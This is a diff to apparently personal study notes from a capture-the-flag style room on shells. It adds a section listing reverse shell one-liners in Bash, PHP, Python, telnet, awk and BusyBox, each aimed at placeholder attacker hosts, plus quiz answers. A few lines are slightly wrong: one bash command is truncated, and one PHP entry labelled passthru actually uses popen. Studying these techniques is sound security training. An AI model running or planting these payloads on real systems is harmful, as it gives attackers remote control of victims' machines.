@@ -6,6 +6,7 @@
 - [Reverse Shell](#reverse-shell)
 - [Bind Shell](#bind-shell)
 - [Shell Listeners](#shell-listeners)
+- [Shell Payloads](#shell-payloads)
 
 
 ## Room Introduction
@@ -167,8 +168,6 @@ Amazing, worked first time. For reference, the left window is the reverse shell 
 Interestingly, you can't just `sudo` as _`sudo`_ wants the password entered on the host machine. 
 ![](Images/Pasted%20image%2020250622114147.png)
 
-
-
 ### ❓ Question
 > What type of shell opens a specific port on the target for incoming connections from the attacker?
 #### 🧪 Process
@@ -186,6 +185,7 @@ Oh I missed this, so apparently ports below **`1024`** require elevated privileg
 Trying this as the answer
 #### ✅ Answer
 - `8080`
+
 
 ## Shell Listeners
 Apparently _`nc`_ isn't the only cat in town. 
@@ -246,3 +246,91 @@ This was **Ncat**
 Trying this as the answer
 #### ✅ Answer
 - `Ncat`
+
+
+## Shell Payloads
+A shell payload could be a command or script that opens the shell to inbound connections.
+
+### Bash
+**Normal Bash Reverse Shell**
+- Bash: -i >& /dev/tcp/1.2.3.4/443 0>&1`
+	- Initiates interactive shell. IO redirected though TCP on specified port.  
+
+**Bash Read line Reverse Shell**
+- Bash: `exec 5<>/dev/tcp/1.2.3.4/443; cat <&5 | while read line; do $line 2>&5 >&5; done`
+	- Creates new file descriptor. Connects over TCP. Reads and executes from socket and returns output via same socket.
+
+**Bash With File Descriptor 196 Reverse Shell**
+- Bash: `0<&196;exec 196<>/dev/tcp/1.2.3.4/443; sh <&196 >&196 2>&196`
+	- Uses file descriptor to establish TCP connection. Reads commands and returns over same connection
+
+**Bash With File Descriptor 5 Reverse Shell**
+- Bash: `bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5`
+	- Again, using file description `5`. Again IO over TCP.
+### PHP
+**PHP Reverse Shell Using the exec Function**
+- PHP: `php -r '$sock=fsockopen("1.2.3.4",443);exec("sh <&3 >&3 2>&3");'`
+	- Uses exec function to execute shell and redirects stdout and stdin
+
+**PHP Reverse Shell Using the shell_exec Function**
+- PHP: `php -r '$sock=fsockopen("1.2.3.4",443);shell_exec("sh <&3 >&3 2>&3");'`
+	- Uses `shell_exec` instead
+
+**PHP Reverse Shell Using the system Function**
+- PHP: `php -r '$sock=fsockopen("1.2.3.4",443);system("sh <&3 >&3 2>&3");'`
+	- Uses `system`
+
+**PHP Reverse Shell Using the passthru Function**
+- PHP: `php -r '$sock=fsockopen("1.2.3.4",443);popen("sh <&3 >&3 2>&3", "r");'`
+	- Uses `popen` as file pointer
+### Python
+**Python Reverse Shell by Exporting Environment Variables**
+- Python: `export RHOST="1.2.3.4"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'`
+	- Creates remote host & port as environmental variables.  sets up socket, and duplicates socket file descriptor for stdin/stdout
+
+**Python Reverse Shell Using the subprocess Module**
+- Python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`
+	- Uses the `subprocess` module to spawn shell, then configure similar environment as python reverse shell after the Environmental Variables are exported.
+
+**Short Python Reverse Shell**
+- Python: `python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'`
+	- Creates `s` socket connects attacker and uses stdin/stdout.
+
+### Others
+**Telnet**
+- Telnet: `TF=$(mktemp -u); mkfifo $TF && telnet 1.2.3.4443 0<$TF | sh 1>$TF`
+	- Creates named pipeline and connects attacker via telnet
+
+**AWK**
+- AWK:  `awk 'BEGIN {s = "/inet/tcp/0/1.2.3.4/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`
+	- Uses awk built in tcp to connect to attacker. Reads commands and returns over same TCP connection
+**BusyBox**
+- busybox: `busybox nc 1.2.3.4 443 -e sh`
+	- Uses same process as nc
+
+### ❓ Question
+> Which Python module is commonly used for managing shell commands and establishing reverse shell connections in security assessments?
+#### 🧪 Process
+Subprocess
+
+Trying this as the answer
+#### ✅ Answer
+- `subprocess` ✅
+
+### ❓ Question
+> What shell payload method in a common scripting language uses the `exec`, `shell_exec`, `system`, `passthru`, and `popen` functions to execute commands remotely through a TCP connection?
+#### 🧪 Process
+These are all common with _PHP_.
+
+Trying this as the answer
+#### ✅ Answer
+- `PHP` ✅
+
+### ❓ Question
+> Which scripting language can use a reverse shell by exporting environment variables and creating a socket connection?
+#### 🧪 Process
+The only scripting language we used here was python.
+
+Trying this as the answer
+#### ✅ Answer
+- `python` ✅
